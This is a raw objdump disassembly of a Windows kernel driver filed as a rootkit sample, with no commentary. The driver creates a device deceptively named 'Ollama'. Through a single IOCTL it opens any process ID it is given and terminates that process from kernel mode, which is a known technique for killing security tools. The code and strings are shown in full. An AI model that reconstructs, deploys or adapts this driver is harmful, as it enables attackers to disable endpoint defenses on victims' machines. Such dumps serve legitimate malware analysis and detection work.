
malware_samples/rootkit/f57cdd4806657478e1ead64234c2f6d038893d9be4c513f4d3624963b8a9e24c.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	40 53                	rex push %rbx
   140001002:	48 83 ec 20          	sub    $0x20,%rsp
   140001006:	48 8d 0d 53 04 00 00 	lea    0x453(%rip),%rcx        # 0x140001460
   14000100d:	48 8b da             	mov    %rdx,%rbx
   140001010:	e8 13 03 00 00       	call   0x140001328
   140001015:	33 d2                	xor    %edx,%edx
   140001017:	c7 43 30 00 00 00 00 	movl   $0x0,0x30(%rbx)
   14000101e:	48 8b cb             	mov    %rbx,%rcx
   140001021:	48 c7 43 38 00 00 00 	movq   $0x0,0x38(%rbx)
   140001028:	00 
   140001029:	ff 15 d9 0f 00 00    	call   *0xfd9(%rip)        # 0x140002008
   14000102f:	33 c0                	xor    %eax,%eax
   140001031:	48 83 c4 20          	add    $0x20,%rsp
   140001035:	5b                   	pop    %rbx
   140001036:	c3                   	ret
   140001037:	cc                   	int3
   140001038:	cc                   	int3
   140001039:	cc                   	int3
   14000103a:	cc                   	int3
   14000103b:	cc                   	int3
   14000103c:	cc                   	int3
   14000103d:	cc                   	int3
   14000103e:	cc                   	int3
   14000103f:	cc                   	int3
   140001040:	40 53                	rex push %rbx
   140001042:	48 83 ec 20          	sub    $0x20,%rsp
   140001046:	48 8d 0d 03 04 00 00 	lea    0x403(%rip),%rcx        # 0x140001450
   14000104d:	48 8b da             	mov    %rdx,%rbx
   140001050:	e8 d3 02 00 00       	call   0x140001328
   140001055:	33 d2                	xor    %edx,%edx
   140001057:	c7 43 30 00 00 00 00 	movl   $0x0,0x30(%rbx)
   14000105e:	48 8b cb             	mov    %rbx,%rcx
   140001061:	48 c7 43 38 00 00 00 	movq   $0x0,0x38(%rbx)
   140001068:	00 
   140001069:	ff 15 99 0f 00 00    	call   *0xf99(%rip)        # 0x140002008
   14000106f:	33 c0                	xor    %eax,%eax
   140001071:	48 83 c4 20          	add    $0x20,%rsp
   140001075:	5b                   	pop    %rbx
   140001076:	c3                   	ret
   140001077:	cc                   	int3
   140001078:	cc                   	int3
   140001079:	cc                   	int3
   14000107a:	cc                   	int3
   14000107b:	cc                   	int3
   14000107c:	cc                   	int3
   14000107d:	cc                   	int3
   14000107e:	cc                   	int3
   14000107f:	cc                   	int3
   140001080:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001085:	57                   	push   %rdi
   140001086:	48 83 ec 20          	sub    $0x20,%rsp
   14000108a:	48 8b 82 b8 00 00 00 	mov    0xb8(%rdx),%rax
   140001091:	48 8b fa             	mov    %rdx,%rdi
   140001094:	bb 10 00 00 c0       	mov    $0xc0000010,%ebx
   140001099:	81 78 18 00 20 22 00 	cmpl   $0x222000,0x18(%rax)
   1400010a0:	75 2d                	jne    0x1400010cf
   1400010a2:	83 78 10 08          	cmpl   $0x8,0x10(%rax)
   1400010a6:	73 07                	jae    0x1400010af
   1400010a8:	bb 23 00 00 c0       	mov    $0xc0000023,%ebx
   1400010ad:	eb 20                	jmp    0x1400010cf
   1400010af:	48 8b 42 18          	mov    0x18(%rdx),%rax
   1400010b3:	48 8b 08             	mov    (%rax),%rcx
   1400010b6:	48 85 c9             	test   %rcx,%rcx
   1400010b9:	74 0f                	je     0x1400010ca
   1400010bb:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   1400010bf:	74 09                	je     0x1400010ca
   1400010c1:	e8 96 01 00 00       	call   0x14000125c
   1400010c6:	8b d8                	mov    %eax,%ebx
   1400010c8:	eb 05                	jmp    0x1400010cf
   1400010ca:	bb 0d 00 00 c0       	mov    $0xc000000d,%ebx
   1400010cf:	33 d2                	xor    %edx,%edx
   1400010d1:	89 5f 30             	mov    %ebx,0x30(%rdi)
   1400010d4:	48 8b cf             	mov    %rdi,%rcx
   1400010d7:	48 c7 47 38 00 00 00 	movq   $0x0,0x38(%rdi)
   1400010de:	00 
   1400010df:	ff 15 23 0f 00 00    	call   *0xf23(%rip)        # 0x140002008
   1400010e5:	8b c3                	mov    %ebx,%eax
   1400010e7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400010ec:	48 83 c4 20          	add    $0x20,%rsp
   1400010f0:	5f                   	pop    %rdi
   1400010f1:	c3                   	ret
   1400010f2:	cc                   	int3
   1400010f3:	cc                   	int3
   1400010f4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400010f9:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   1400010fe:	55                   	push   %rbp
   1400010ff:	48 8b ec             	mov    %rsp,%rbp
   140001102:	48 83 ec 60          	sub    $0x60,%rsp
   140001106:	48 8d 05 73 02 00 00 	lea    0x273(%rip),%rax        # 0x140001380
   14000110d:	c7 45 e0 1c 00 1e 00 	movl   $0x1e001c,-0x20(%rbp)
   140001114:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140001118:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   14000111c:	48 8d 05 7d 02 00 00 	lea    0x27d(%rip),%rax        # 0x1400013a0
   140001123:	c7 45 f0 14 00 16 00 	movl   $0x160014,-0x10(%rbp)
   14000112a:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   14000112e:	41 b9 22 00 00 00    	mov    $0x22,%r9d
   140001134:	48 8d 45 20          	lea    0x20(%rbp),%rax
   140001138:	48 c7 45 20 00 00 00 	movq   $0x0,0x20(%rbp)
   14000113f:	00 
   140001140:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001145:	33 d2                	xor    %edx,%edx
   140001147:	c6 44 24 28 00       	movb   $0x0,0x28(%rsp)
   14000114c:	48 8b f9             	mov    %rcx,%rdi
   14000114f:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
   140001156:	00 
   140001157:	ff 15 b3 0e 00 00    	call   *0xeb3(%rip)        # 0x140002010
   14000115d:	8b d8                	mov    %eax,%ebx
   14000115f:	85 c0                	test   %eax,%eax
   140001161:	79 15                	jns    0x140001178
   140001163:	0f ae e8             	lfence
   140001166:	48 8d 0d 53 02 00 00 	lea    0x253(%rip),%rcx        # 0x1400013c0
   14000116d:	8b d3                	mov    %ebx,%edx
   14000116f:	e8 b4 01 00 00       	call   0x140001328
   140001174:	8b c3                	mov    %ebx,%eax
   140001176:	eb 7b                	jmp    0x1400011f3
   140001178:	48 8b 45 20          	mov    0x20(%rbp),%rax
   14000117c:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   140001180:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140001184:	83 48 30 04          	orl    $0x4,0x30(%rax)
   140001188:	ff 15 8a 0e 00 00    	call   *0xe8a(%rip)        # 0x140002018
   14000118e:	8b d8                	mov    %eax,%ebx
   140001190:	85 c0                	test   %eax,%eax
   140001192:	79 16                	jns    0x1400011aa
   140001194:	0f ae e8             	lfence
   140001197:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   14000119b:	ff 15 7f 0e 00 00    	call   *0xe7f(%rip)        # 0x140002020
   1400011a1:	48 8d 0d 38 02 00 00 	lea    0x238(%rip),%rcx        # 0x1400013e0
   1400011a8:	eb c3                	jmp    0x14000116d
   1400011aa:	48 8d 05 5f 00 00 00 	lea    0x5f(%rip),%rax        # 0x140001210
   1400011b1:	48 89 47 68          	mov    %rax,0x68(%rdi)
   1400011b5:	48 8d 0d 54 02 00 00 	lea    0x254(%rip),%rcx        # 0x140001410
   1400011bc:	48 8d 05 7d fe ff ff 	lea    -0x183(%rip),%rax        # 0x140001040
   1400011c3:	48 89 47 70          	mov    %rax,0x70(%rdi)
   1400011c7:	48 8d 05 32 fe ff ff 	lea    -0x1ce(%rip),%rax        # 0x140001000
   1400011ce:	48 89 87 80 00 00 00 	mov    %rax,0x80(%rdi)
   1400011d5:	48 8d 05 a4 fe ff ff 	lea    -0x15c(%rip),%rax        # 0x140001080
   1400011dc:	48 89 87 e0 00 00 00 	mov    %rax,0xe0(%rdi)
   1400011e3:	48 8b 45 20          	mov    0x20(%rbp),%rax
   1400011e7:	0f ba 70 30 07       	btrl   $0x7,0x30(%rax)
   1400011ec:	e8 37 01 00 00       	call   0x140001328
   1400011f1:	33 c0                	xor    %eax,%eax
   1400011f3:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   1400011f8:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   1400011fd:	48 83 c4 60          	add    $0x60,%rsp
   140001201:	5d                   	pop    %rbp
   140001202:	c3                   	ret
   140001203:	cc                   	int3
   140001204:	cc                   	int3
   140001205:	cc                   	int3
   140001206:	cc                   	int3
   140001207:	cc                   	int3
   140001208:	cc                   	int3
   140001209:	cc                   	int3
   14000120a:	cc                   	int3
   14000120b:	cc                   	int3
   14000120c:	cc                   	int3
   14000120d:	cc                   	int3
   14000120e:	cc                   	int3
   14000120f:	cc                   	int3
   140001210:	40 53                	rex push %rbx
   140001212:	48 83 ec 30          	sub    $0x30,%rsp
   140001216:	48 8b d9             	mov    %rcx,%rbx
   140001219:	c7 44 24 20 14 00 16 	movl   $0x160014,0x20(%rsp)
   140001220:	00 
   140001221:	48 8d 05 78 01 00 00 	lea    0x178(%rip),%rax        # 0x1400013a0
   140001228:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000122d:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001232:	ff 15 f0 0d 00 00    	call   *0xdf0(%rip)        # 0x140002028
   140001238:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   14000123c:	48 85 c9             	test   %rcx,%rcx
   14000123f:	74 06                	je     0x140001247
   140001241:	ff 15 d9 0d 00 00    	call   *0xdd9(%rip)        # 0x140002020
   140001247:	48 8d 0d e2 01 00 00 	lea    0x1e2(%rip),%rcx        # 0x140001430
   14000124e:	e8 d5 00 00 00       	call   0x140001328
   140001253:	48 83 c4 30          	add    $0x30,%rsp
   140001257:	5b                   	pop    %rbx
   140001258:	c3                   	ret
   140001259:	cc                   	int3
   14000125a:	cc                   	int3
   14000125b:	cc                   	int3
   14000125c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001261:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140001266:	55                   	push   %rbp
   140001267:	48 8b ec             	mov    %rsp,%rbp
   14000126a:	48 83 ec 60          	sub    $0x60,%rsp
   14000126e:	48 8b d9             	mov    %rcx,%rbx
   140001271:	48 89 4d c0          	mov    %rcx,-0x40(%rbp)
   140001275:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001278:	48 c7 45 10 00 00 00 	movq   $0x0,0x10(%rbp)
   14000127f:	00 
   140001280:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140001284:	c7 45 d0 30 00 00 00 	movl   $0x30,-0x30(%rbp)
   14000128b:	4c 8d 4d c0          	lea    -0x40(%rbp),%r9
   14000128f:	48 c7 45 d8 00 00 00 	movq   $0x0,-0x28(%rbp)
   140001296:	00 
   140001297:	4c 8d 45 d0          	lea    -0x30(%rbp),%r8
   14000129b:	c7 45 e8 00 02 00 00 	movl   $0x200,-0x18(%rbp)
   1400012a2:	ba 01 00 10 00       	mov    $0x100001,%edx
   1400012a7:	48 c7 45 e0 00 00 00 	movq   $0x0,-0x20(%rbp)
   1400012ae:	00 
   1400012af:	f3 0f 7f 45 f0       	movdqu %xmm0,-0x10(%rbp)
   1400012b4:	48 c7 45 c8 00 00 00 	movq   $0x0,-0x38(%rbp)
   1400012bb:	00 
   1400012bc:	ff 15 7e 0d 00 00    	call   *0xd7e(%rip)        # 0x140002040
   1400012c2:	8b f8                	mov    %eax,%edi
   1400012c4:	85 c0                	test   %eax,%eax
   1400012c6:	79 18                	jns    0x1400012e0
   1400012c8:	48 8d 0d a1 01 00 00 	lea    0x1a1(%rip),%rcx        # 0x140001470
   1400012cf:	8b d7                	mov    %edi,%edx
   1400012d1:	4c 8b c3             	mov    %rbx,%r8
   1400012d4:	0f ae e8             	lfence
   1400012d7:	e8 4c 00 00 00       	call   0x140001328
   1400012dc:	8b c7                	mov    %edi,%eax
   1400012de:	eb 36                	jmp    0x140001316
   1400012e0:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   1400012e4:	33 d2                	xor    %edx,%edx
   1400012e6:	ff 15 4c 0d 00 00    	call   *0xd4c(%rip)        # 0x140002038
   1400012ec:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   1400012f0:	8b f8                	mov    %eax,%edi
   1400012f2:	ff 15 38 0d 00 00    	call   *0xd38(%rip)        # 0x140002030
   1400012f8:	85 ff                	test   %edi,%edi
   1400012fa:	79 09                	jns    0x140001305
   1400012fc:	48 8d 0d 9d 01 00 00 	lea    0x19d(%rip),%rcx        # 0x1400014a0
   140001303:	eb ca                	jmp    0x1400012cf
   140001305:	48 8b d3             	mov    %rbx,%rdx
   140001308:	48 8d 0d c1 01 00 00 	lea    0x1c1(%rip),%rcx        # 0x1400014d0
   14000130f:	e8 14 00 00 00       	call   0x140001328
   140001314:	33 c0                	xor    %eax,%eax
   140001316:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   14000131b:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   14000131f:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   140001323:	49 8b e3             	mov    %r11,%rsp
   140001326:	5d                   	pop    %rbp
   140001327:	c3                   	ret
   140001328:	ff 25 d2 0c 00 00    	jmp    *0xcd2(%rip)        # 0x140002000
   14000132e:	cc                   	int3
   14000132f:	cc                   	int3
   140001330:	c2 00 00             	ret    $0x0
   140001333:	cc                   	int3
   140001334:	cc                   	int3
   140001335:	cc                   	int3
   140001336:	cc                   	int3
   140001337:	cc                   	int3
   140001338:	cc                   	int3
   140001339:	cc                   	int3
   14000133a:	cc                   	int3
   14000133b:	cc                   	int3
   14000133c:	cc                   	int3
   14000133d:	cc                   	int3
   14000133e:	cc                   	int3
   14000133f:	cc                   	int3
   140001340:	cc                   	int3
   140001341:	cc                   	int3
   140001342:	cc                   	int3
   140001343:	cc                   	int3
   140001344:	cc                   	int3
   140001345:	cc                   	int3
   140001346:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000134d:	00 00 00 
   140001350:	ff e0                	jmp    *%rax
   140001352:	cc                   	int3
   140001353:	cc                   	int3
   140001354:	cc                   	int3
   140001355:	cc                   	int3
   140001356:	cc                   	int3
   140001357:	cc                   	int3
   140001358:	cc                   	int3
   140001359:	cc                   	int3
   14000135a:	cc                   	int3
   14000135b:	cc                   	int3
   14000135c:	cc                   	int3
   14000135d:	cc                   	int3
   14000135e:	cc                   	int3
   14000135f:	cc                   	int3
   140001360:	cc                   	int3
   140001361:	cc                   	int3
   140001362:	cc                   	int3
   140001363:	cc                   	int3
   140001364:	cc                   	int3
   140001365:	cc                   	int3
   140001366:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000136d:	00 00 00 
   140001370:	ff 25 32 0e 00 00    	jmp    *0xe32(%rip)        # 0x1400021a8
   140001376:	cc                   	int3
   140001377:	cc                   	int3
   140001378:	cc                   	int3
   140001379:	cc                   	int3
   14000137a:	cc                   	int3
   14000137b:	cc                   	int3
   14000137c:	cc                   	int3
   14000137d:	cc                   	int3
   14000137e:	cc                   	int3
   14000137f:	cc                   	int3
   140001380:	5c                   	pop    %rsp
   140001381:	00 44 00 65          	add    %al,0x65(%rax,%rax,1)
   140001385:	00 76 00             	add    %dh,0x0(%rsi)
   140001388:	69 00 63 00 65 00    	imul   $0x650063,(%rax),%eax
   14000138e:	5c                   	pop    %rsp
   14000138f:	00 4f 00             	add    %cl,0x0(%rdi)
   140001392:	6c                   	insb   (%dx),(%rdi)
   140001393:	00 6c 00 61          	add    %ch,0x61(%rax,%rax,1)
   140001397:	00 6d 00             	add    %ch,0x0(%rbp)
   14000139a:	61                   	(bad)
   14000139b:	00 00                	add    %al,(%rax)
   14000139d:	00 cc                	add    %cl,%ah
   14000139f:	cc                   	int3
   1400013a0:	5c                   	pop    %rsp
   1400013a1:	00 3f                	add    %bh,(%rdi)
   1400013a3:	00 3f                	add    %bh,(%rdi)
   1400013a5:	00 5c 00 4f          	add    %bl,0x4f(%rax,%rax,1)
   1400013a9:	00 6c 00 6c          	add    %ch,0x6c(%rax,%rax,1)
   1400013ad:	00 61 00             	add    %ah,0x0(%rcx)
   1400013b0:	6d                   	insl   (%dx),(%rdi)
   1400013b1:	00 61 00             	add    %ah,0x0(%rcx)
   1400013b4:	00 00                	add    %al,(%rax)
   1400013b6:	cc                   	int3
   1400013b7:	cc                   	int3
   1400013b8:	cc                   	int3
   1400013b9:	cc                   	int3
   1400013ba:	cc                   	int3
   1400013bb:	cc                   	int3
   1400013bc:	cc                   	int3
   1400013bd:	cc                   	int3
   1400013be:	cc                   	int3
   1400013bf:	cc                   	int3
   1400013c0:	49 6f                	rex.WB outsl (%rsi),(%dx)
   1400013c2:	43 72 65             	rex.XB jb 0x14000142a
   1400013c5:	61                   	(bad)
   1400013c6:	74 65                	je     0x14000142d
   1400013c8:	44                   	rex.R
   1400013c9:	65 76 69             	gs jbe 0x140001435
   1400013cc:	63 65 20             	movsxd 0x20(%rbp),%esp
   1400013cf:	66 61                	data16 (bad)
   1400013d1:	69 6c 65 64 3a 20 30 	imul   $0x7830203a,0x64(%rbp,%riz,2),%ebp
   1400013d8:	78 
   1400013d9:	25 58 0a 00 cc       	and    $0xcc000a58,%eax
   1400013de:	cc                   	int3
   1400013df:	cc                   	int3
   1400013e0:	49 6f                	rex.WB outsl (%rsi),(%dx)
   1400013e2:	43 72 65             	rex.XB jb 0x14000144a
   1400013e5:	61                   	(bad)
   1400013e6:	74 65                	je     0x14000144d
   1400013e8:	53                   	push   %rbx
   1400013e9:	79 6d                	jns    0x140001458
   1400013eb:	62 6f 6c 69 63       	(bad)
   1400013f0:	4c 69 6e 6b 20 66 61 	imul   $0x69616620,0x6b(%rsi),%r13
   1400013f7:	69 
   1400013f8:	6c                   	insb   (%dx),(%rdi)
   1400013f9:	65 64 3a 20          	gs cmp %fs:(%rax),%ah
   1400013fd:	30 78 25             	xor    %bh,0x25(%rax)
   140001400:	58                   	pop    %rax
   140001401:	0a 00                	or     (%rax),%al
   140001403:	cc                   	int3
   140001404:	cc                   	int3
   140001405:	cc                   	int3
   140001406:	cc                   	int3
   140001407:	cc                   	int3
   140001408:	cc                   	int3
   140001409:	cc                   	int3
   14000140a:	cc                   	int3
   14000140b:	cc                   	int3
   14000140c:	cc                   	int3
   14000140d:	cc                   	int3
   14000140e:	cc                   	int3
   14000140f:	cc                   	int3
   140001410:	4d 79 44             	rex.WRB jns 0x140001457
   140001413:	72 69                	jb     0x14000147e
   140001415:	76 65                	jbe    0x14000147c
   140001417:	72 31                	jb     0x14000144a
   140001419:	20 6c 6f 61          	and    %ch,0x61(%rdi,%rbp,2)
   14000141d:	64 65 64 2e 0a 00    	fs gs fs or %fs:(%rax),%al
   140001423:	cc                   	int3
   140001424:	cc                   	int3
   140001425:	cc                   	int3
   140001426:	cc                   	int3
   140001427:	cc                   	int3
   140001428:	cc                   	int3
   140001429:	cc                   	int3
   14000142a:	cc                   	int3
   14000142b:	cc                   	int3
   14000142c:	cc                   	int3
   14000142d:	cc                   	int3
   14000142e:	cc                   	int3
   14000142f:	cc                   	int3
   140001430:	4d 79 44             	rex.WRB jns 0x140001477
   140001433:	72 69                	jb     0x14000149e
   140001435:	76 65                	jbe    0x14000149c
   140001437:	72 31                	jb     0x14000146a
   140001439:	20 75 6e             	and    %dh,0x6e(%rbp)
   14000143c:	6c                   	insb   (%dx),(%rdi)
   14000143d:	6f                   	outsl  (%rsi),(%dx)
   14000143e:	61                   	(bad)
   14000143f:	64 65 64 2e 0a 00    	fs gs fs or %fs:(%rax),%al
   140001445:	cc                   	int3
   140001446:	cc                   	int3
   140001447:	cc                   	int3
   140001448:	cc                   	int3
   140001449:	cc                   	int3
   14000144a:	cc                   	int3
   14000144b:	cc                   	int3
   14000144c:	cc                   	int3
   14000144d:	cc                   	int3
   14000144e:	cc                   	int3
   14000144f:	cc                   	int3
   140001450:	44                   	rex.R
   140001451:	65 76 69             	gs jbe 0x1400014bd
   140001454:	63 65 20             	movsxd 0x20(%rbp),%esp
   140001457:	6f                   	outsl  (%rsi),(%dx)
   140001458:	70 65                	jo     0x1400014bf
   14000145a:	6e                   	outsb  (%rsi),(%dx)
   14000145b:	65 64 2e 0a 00       	gs fs or %fs:(%rax),%al
   140001460:	44                   	rex.R
   140001461:	65 76 69             	gs jbe 0x1400014cd
   140001464:	63 65 20             	movsxd 0x20(%rbp),%esp
   140001467:	63 6c 6f 73          	movsxd 0x73(%rdi,%rbp,2),%ebp
   14000146b:	65 64 2e 0a 00       	gs fs or %fs:(%rax),%al
   140001470:	5a                   	pop    %rdx
   140001471:	77 4f                	ja     0x1400014c2
   140001473:	70 65                	jo     0x1400014da
   140001475:	6e                   	outsb  (%rsi),(%dx)
   140001476:	50                   	push   %rax
   140001477:	72 6f                	jb     0x1400014e8
   140001479:	63 65 73             	movsxd 0x73(%rbp),%esp
   14000147c:	73 20                	jae    0x14000149e
   14000147e:	66 61                	data16 (bad)
   140001480:	69 6c 65 64 3a 20 30 	imul   $0x7830203a,0x64(%rbp,%riz,2),%ebp
   140001487:	78 
   140001488:	25 58 20 28 70       	and    $0x70282058,%eax
   14000148d:	69 64 3d 25 70 29 0a 	imul   $0xa2970,0x25(%rbp,%rdi,1),%esp
   140001494:	00 
   140001495:	cc                   	int3
   140001496:	cc                   	int3
   140001497:	cc                   	int3
   140001498:	cc                   	int3
   140001499:	cc                   	int3
   14000149a:	cc                   	int3
   14000149b:	cc                   	int3
   14000149c:	cc                   	int3
   14000149d:	cc                   	int3
   14000149e:	cc                   	int3
   14000149f:	cc                   	int3
   1400014a0:	5a                   	pop    %rdx
   1400014a1:	77 54                	ja     0x1400014f7
   1400014a3:	65 72 6d             	gs jb  0x140001513
   1400014a6:	69 6e 61 74 65 50 72 	imul   $0x72506574,0x61(%rsi),%ebp
   1400014ad:	6f                   	outsl  (%rsi),(%dx)
   1400014ae:	63 65 73             	movsxd 0x73(%rbp),%esp
   1400014b1:	73 20                	jae    0x1400014d3
   1400014b3:	66 61                	data16 (bad)
   1400014b5:	69 6c 65 64 3a 20 30 	imul   $0x7830203a,0x64(%rbp,%riz,2),%ebp
   1400014bc:	78 
   1400014bd:	25 58 20 28 70       	and    $0x70282058,%eax
   1400014c2:	69 64 3d 25 70 29 0a 	imul   $0xa2970,0x25(%rbp,%rdi,1),%esp
   1400014c9:	00 
   1400014ca:	cc                   	int3
   1400014cb:	cc                   	int3
   1400014cc:	cc                   	int3
   1400014cd:	cc                   	int3
   1400014ce:	cc                   	int3
   1400014cf:	cc                   	int3
   1400014d0:	50                   	push   %rax
   1400014d1:	72 6f                	jb     0x140001542
   1400014d3:	63 65 73             	movsxd 0x73(%rbp),%esp
   1400014d6:	73 20                	jae    0x1400014f8
   1400014d8:	25 70 20 74 65       	and    $0x65742070,%eax
   1400014dd:	72 6d                	jb     0x14000154c
   1400014df:	69 6e 61 74 65 64 2e 	imul   $0x2e646574,0x61(%rsi),%ebp
   1400014e6:	0a 00                	or     (%rax),%al

Disassembly of section INIT:

0000000140005000 <INIT>:
   140005000:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005005:	57                   	push   %rdi
   140005006:	48 83 ec 20          	sub    $0x20,%rsp
   14000500a:	48 8b da             	mov    %rdx,%rbx
   14000500d:	48 8b f9             	mov    %rcx,%rdi
   140005010:	e8 17 00 00 00       	call   0x14000502c
   140005015:	48 8b d3             	mov    %rbx,%rdx
   140005018:	48 8b cf             	mov    %rdi,%rcx
   14000501b:	e8 d4 c0 ff ff       	call   0x1400010f4
   140005020:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005025:	48 83 c4 20          	add    $0x20,%rsp
   140005029:	5f                   	pop    %rdi
   14000502a:	c3                   	ret
   14000502b:	cc                   	int3
   14000502c:	48 8b 05 cd df ff ff 	mov    -0x2033(%rip),%rax        # 0x140003000
   140005033:	48 85 c0             	test   %rax,%rax
   140005036:	74 1b                	je     0x140005053
   140005038:	48 b9 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rcx
   14000503f:	2b 00 00 
   140005042:	48 3b c1             	cmp    %rcx,%rax
   140005045:	74 0c                	je     0x140005053
   140005047:	48 f7 d0             	not    %rax
   14000504a:	48 89 05 b7 df ff ff 	mov    %rax,-0x2049(%rip)        # 0x140003008
   140005051:	c3                   	ret
   140005052:	cc                   	int3
   140005053:	b9 06 00 00 00       	mov    $0x6,%ecx
   140005058:	cd 29                	int    $0x29
   14000505a:	cc                   	int3
   14000505b:	cc                   	int3
   14000505c:	88 50 00             	mov    %dl,0x0(%rax)
	...
   140005067:	00 7e 51             	add    %bh,0x51(%rsi)
   14000506a:	00 00                	add    %al,(%rax)
   14000506c:	00 20                	add    %ah,(%rax)
	...
   140005086:	00 00                	add    %al,(%rax)
   140005088:	d8 50 00             	fcoms  0x0(%rax)
   14000508b:	00 00                	add    %al,(%rax)
   14000508d:	00 00                	add    %al,(%rax)
   14000508f:	00 e4                	add    %ah,%ah
   140005091:	50                   	push   %rax
   140005092:	00 00                	add    %al,(%rax)
   140005094:	00 00                	add    %al,(%rax)
   140005096:	00 00                	add    %al,(%rax)
   140005098:	fa                   	cli
   140005099:	50                   	push   %rax
   14000509a:	00 00                	add    %al,(%rax)
   14000509c:	00 00                	add    %al,(%rax)
   14000509e:	00 00                	add    %al,(%rax)
   1400050a0:	0c 51                	or     $0x51,%al
   1400050a2:	00 00                	add    %al,(%rax)
   1400050a4:	00 00                	add    %al,(%rax)
   1400050a6:	00 00                	add    %al,(%rax)
   1400050a8:	24 51                	and    $0x51,%al
   1400050aa:	00 00                	add    %al,(%rax)
   1400050ac:	00 00                	add    %al,(%rax)
   1400050ae:	00 00                	add    %al,(%rax)
   1400050b0:	36 51                	ss push %rcx
   1400050b2:	00 00                	add    %al,(%rax)
   1400050b4:	00 00                	add    %al,(%rax)
   1400050b6:	00 00                	add    %al,(%rax)
   1400050b8:	4e 51                	rex.WRX push %rcx
   1400050ba:	00 00                	add    %al,(%rax)
   1400050bc:	00 00                	add    %al,(%rax)
   1400050be:	00 00                	add    %al,(%rax)
   1400050c0:	58                   	pop    %rax
   1400050c1:	51                   	push   %rcx
   1400050c2:	00 00                	add    %al,(%rax)
   1400050c4:	00 00                	add    %al,(%rax)
   1400050c6:	00 00                	add    %al,(%rax)
   1400050c8:	6e                   	outsb  (%rsi),(%dx)
   1400050c9:	51                   	push   %rcx
	...
   1400050d6:	00 00                	add    %al,(%rax)
   1400050d8:	76 00                	jbe    0x1400050da
   1400050da:	44 62 67 50 72 69    	(bad)
   1400050e0:	6e                   	outsb  (%rsi),(%dx)
   1400050e1:	74 00                	je     0x1400050e3
   1400050e3:	00 76 04             	add    %dh,0x4(%rsi)
   1400050e6:	49 6f                	rex.WB outsl (%rsi),(%dx)
   1400050e8:	66 43 6f             	rex.XB outsw (%rsi),(%dx)
   1400050eb:	6d                   	insl   (%dx),(%rdi)
   1400050ec:	70 6c                	jo     0x14000515a
   1400050ee:	65 74 65             	gs je  0x140005156
   1400050f1:	52                   	push   %rdx
   1400050f2:	65 71 75             	gs jno 0x14000516a
   1400050f5:	65 73 74             	gs jae 0x14000516c
   1400050f8:	00 00                	add    %al,(%rax)
   1400050fa:	43 03 49 6f          	rex.XB add 0x6f(%r9),%ecx
   1400050fe:	43 72 65             	rex.XB jb 0x140005166
   140005101:	61                   	(bad)
   140005102:	74 65                	je     0x140005169
   140005104:	44                   	rex.R
   140005105:	65 76 69             	gs jbe 0x140005171
   140005108:	63 65 00             	movsxd 0x0(%rbp),%esp
   14000510b:	00 50 03             	add    %dl,0x3(%rax)
   14000510e:	49 6f                	rex.WB outsl (%rsi),(%dx)
   140005110:	43 72 65             	rex.XB jb 0x140005178
   140005113:	61                   	(bad)
   140005114:	74 65                	je     0x14000517b
   140005116:	53                   	push   %rbx
   140005117:	79 6d                	jns    0x140005186
   140005119:	62 6f 6c 69 63       	(bad)
   14000511e:	4c 69 6e 6b 00 00 5d 	imul   $0x35d0000,0x6b(%rsi),%r13
   140005125:	03 
   140005126:	49 6f                	rex.WB outsl (%rsi),(%dx)
   140005128:	44                   	rex.R
   140005129:	65 6c                	gs insb (%dx),(%rdi)
   14000512b:	65 74 65             	gs je  0x140005193
   14000512e:	44                   	rex.R
   14000512f:	65 76 69             	gs jbe 0x14000519b
   140005132:	63 65 00             	movsxd 0x0(%rbp),%esp
   140005135:	00 5f 03             	add    %bl,0x3(%rdi)
   140005138:	49 6f                	rex.WB outsl (%rsi),(%dx)
   14000513a:	44                   	rex.R
   14000513b:	65 6c                	gs insb (%dx),(%rdi)
   14000513d:	65 74 65             	gs je  0x1400051a5
   140005140:	53                   	push   %rbx
   140005141:	79 6d                	jns    0x1400051b0
   140005143:	62 6f 6c 69 63       	(bad)
   140005148:	4c 69 6e 6b 00 00 6a 	imul   $0xb6a0000,0x6b(%rsi),%r13
   14000514f:	0b 
   140005150:	5a                   	pop    %rdx
   140005151:	77 43                	ja     0x140005196
   140005153:	6c                   	insb   (%dx),(%rdi)
   140005154:	6f                   	outsl  (%rsi),(%dx)
   140005155:	73 65                	jae    0x1400051bc
   140005157:	00 41 0c             	add    %al,0xc(%rcx)
   14000515a:	5a                   	pop    %rdx
   14000515b:	77 54                	ja     0x1400051b1
   14000515d:	65 72 6d             	gs jb  0x1400051cd
   140005160:	69 6e 61 74 65 50 72 	imul   $0x72506574,0x61(%rsi),%ebp
   140005167:	6f                   	outsl  (%rsi),(%dx)
